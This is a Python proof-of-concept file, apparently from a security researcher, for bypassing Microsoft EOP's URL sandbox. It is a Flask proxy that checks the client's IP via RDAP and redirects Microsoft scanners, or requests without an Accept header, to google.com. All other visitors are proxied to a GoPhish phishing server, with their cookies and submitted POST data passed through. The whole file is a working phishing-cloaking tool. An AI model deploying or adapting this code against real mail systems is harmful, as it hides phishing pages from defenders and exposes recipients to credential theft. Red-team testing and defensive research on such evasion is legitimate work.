"""
Microsoft EOP URL sandbox bypass
PoC proxy server using client classification
Author: Nimrod (Nimi) Bickels
"""
from flask import Flask, request, redirect, Response
from ipwhois import IPWhois
import logging
import requests

def is_microsoft_ans(ip):
    res = IPWhois(ip).lookup_rdap(depth=1)
    try:
        if 'microsoft' in res['objects']['MSFT']['contact']['name'].lower():
            return True
    except KeyError:
        pass
    return False

def crawler(fn):
    def wrapper(*args, **kwargs):
        client_ip = request.headers.get('X-Forwarded-For', '').split(',')[0] or request.remote_addr
        if is_microsoft_ans(client_ip) or not request.headers.get('Accept', ''):
            logging.info(f"REDIRECTED")
            return redirect('https://google.com')
        return fn(*args, **kwargs)
    return wrapper

app = Flask(__name__)

@app.route('/', defaults={'path': ''}, methods=["GET", "POST"])
@app.route('/<path>', methods=["GET", "POST"])
@crawler
def redirect_to_gophish(path):
    query_string = request.args.to_dict()
    data = None
    if request.method == 'POST':
        data = request.get_data()

    
    res = requests.request( 
        method          = request.method,
        url             = f"http://gophish:80/{path}",
        params          = query_string,
        headers         = {k:v for k,v in request.headers if k.lower() != 'host'}, # exclude 'host' header
        data            = data,
        cookies         = request.cookies,
        allow_redirects = False,
    )
    logging.info(f'FORWARD - "{request.method} {query_string} {data}" to gophish/{path} - {len(res.content)}')
    headers = [(k,v) for k,v in res.raw.headers.items()]

    response = Response(res.content, res.status_code, headers)
    return response